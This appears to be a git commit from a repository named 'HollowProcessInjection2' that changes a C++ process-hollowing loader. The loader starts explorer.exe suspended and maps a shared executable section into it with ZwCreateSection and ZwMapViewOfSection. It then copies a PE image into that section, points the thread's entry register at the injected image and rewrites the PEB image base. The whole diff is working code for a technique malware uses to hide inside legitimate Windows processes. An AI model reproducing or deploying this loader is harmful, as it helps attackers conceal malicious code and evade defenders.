f7b099bc9a520eceec3244bdf88f79a7a2651a13
reevesrs24 <reevesrs24@gmail.com>
2020-01-19 20:05:03 -0500

    Added zw mapping in hollow 3

--- HollowProcessInjection2/HollowProcessInjection2/main.cpp
+++ HollowProcessInjection2/HollowProcessInjection2/main.cpp
@@ -13,7 +13,7 @@ int main()
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 
-	if (!CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
+	if (!CreateProcess("C:\\Windows\\System32\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
 	{
 		printf("CreateProcess Failed (%d).\n", GetLastError());
 	}
@@ -23,10 +23,16 @@ int main()
 
 	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
 	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
+	FARPROC fpZwCreateSection = GetProcAddress(handleToRemoteNtDll, "ZwCreateSection");
+	FARPROC fpZwMapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwMapViewOfSection");
 
-	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
-	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
+	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess) fpNtQueryInformationProcess;
+	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection) fpZwUnmapViewOfSection;
+	_ZwCreateSection ZwCreateSection = (_ZwCreateSection) fpZwCreateSection;
+	_ZwMapViewOfSection ZwMapViewOfSection = (_ZwMapViewOfSection) fpZwMapViewOfSection;
 
+
+	
 
 	PROCESS_BASIC_INFORMATION pbi;
 	PULONG returnLen = NULL;
@@ -67,21 +73,68 @@ int main()
 
 	
 
-	LPVOID lpVMem = VirtualAllocEx(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	//LPVOID lpVMem = VirtualAllocEx(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, pNTHeaderYo->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
+	HANDLE secHandle = NULL;
 
+	LARGE_INTEGER pLarge;
+	pLarge.QuadPart = pNTHeaderYo->OptionalHeader.SizeOfImage;
+
+	NTSTATUS s = ZwCreateSection(
+		&secHandle,
+		SECTION_ALL_ACCESS,
+		NULL,
+		&pLarge,
+		PAGE_EXECUTE_READWRITE,
+		SEC_COMMIT,
+		NULL
+	);
+	printf("Process id: %i\n", GetCurrentProcessId());
+	printf("Created Process id: %i\n", pi.dwProcessId);
+
+	SIZE_T commitSize = pNTHeaderYo->OptionalHeader.SizeOfImage;
+	SIZE_T viewSize = 0;
+	SIZE_T viewSize2 = 0;
+	PVOID sectionBaseAddress = NULL;
+	PVOID sectionBaseAddress2 = NULL;
+
+	s = ZwMapViewOfSection(
+		secHandle,
+		GetCurrentProcess(),
+		&sectionBaseAddress,
+		NULL,
+		NULL,
+		NULL,
+		&viewSize,
+		ViewShare,
+		NULL,
+		PAGE_EXECUTE_READWRITE
+	);
+	
+	s = ZwMapViewOfSection(
+		secHandle,
+		pi.hProcess,
+		&sectionBaseAddress2,
+		NULL,
+		NULL,
+		NULL,
+		&viewSize2,
+		ViewShare,
+		NULL,
+		PAGE_EXECUTE_READWRITE
+	);
 
 	BYTE* headerBuffer = new BYTE[pNTHeaderYo->OptionalHeader.SizeOfHeaders];
 
 	memcpy(headerBuffer, dosHeaderYo, pNTHeaderYo->OptionalHeader.SizeOfHeaders);
 
-
-	if (!WriteProcessMemory(pi.hProcess, (LPVOID)pNTHeaderYo->OptionalHeader.ImageBase, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
+	
+	if (!WriteProcessMemory(GetCurrentProcess(), sectionBaseAddress, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
 	{
 		printf("Failed: Unable to write headers: %i", GetLastError());
 		return -1;
 	}
-
+	
 
 	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pNTHeaderYo);
 
@@ -92,7 +145,7 @@ int main()
 
 		printf("Copying data from: %s\n", sectionHeader->Name);
 
-		if (!WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pNTHeaderYo->OptionalHeader.ImageBase + (DWORD)sectionHeader->VirtualAddress), section, (DWORD)sectionHeader->SizeOfRawData, NULL))
+		if (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)((DWORD)sectionBaseAddress + (DWORD)sectionHeader->VirtualAddress), section, (DWORD)sectionHeader->SizeOfRawData, NULL))
 		{
 			printf("Failed: %i", GetLastError());
 			return -1;
@@ -100,12 +153,12 @@ int main()
 		sectionHeader++;
 	}
 
-	
+	s = ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
 
 	PCONTEXT lpContext = new CONTEXT();
 	lpContext->ContextFlags = CONTEXT_FULL;
 	GetThreadContext(pi.hThread, lpContext);
-	lpContext->Eax = (DWORD)pNTHeaderYo->OptionalHeader.ImageBase + (DWORD)pNTHeaderYo->OptionalHeader.AddressOfEntryPoint;
+	lpContext->Eax = (DWORD)sectionBaseAddress2 + (DWORD)pNTHeaderYo->OptionalHeader.AddressOfEntryPoint;
 
 
 	printf("EAX: %x\n", lpContext->Eax);
@@ -115,22 +168,23 @@ int main()
 		lpContext
 	);
 
-	/*
-	DWORD temp = (DWORD)peb->ImageBaseAddress;
+	
+	DWORD temp = (DWORD)sectionBaseAddress2;
 	DWORD* pTemp = &temp;
-	*/
+	
 
+	
 	WriteProcessMemory(
 		pi.hProcess,
 		(LPVOID)((DWORD)pbi.PebBaseAddress + 8),
-		&pNTHeaderYo->OptionalHeader.ImageBase,
+		pTemp,
 		4,
 		NULL
 	);
-
+	
 	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);
 
-	printf("Created Process Image Base Address %x\n", peb->ImageBaseAddress);
+	printf("Created Process Image Base Address %x\n", sectionBaseAddress);
 
 	//ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);
 
@@ -141,14 +195,6 @@ int main()
 	
 	
 	/*
-
-	WriteProcessMemory(
-		pi.hProcess,
-		(LPVOID)((DWORD)pbi.PebBaseAddress + 8),
-		pTemp,
-		4,
-		NULL
-	);
 
 	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);
 	*/
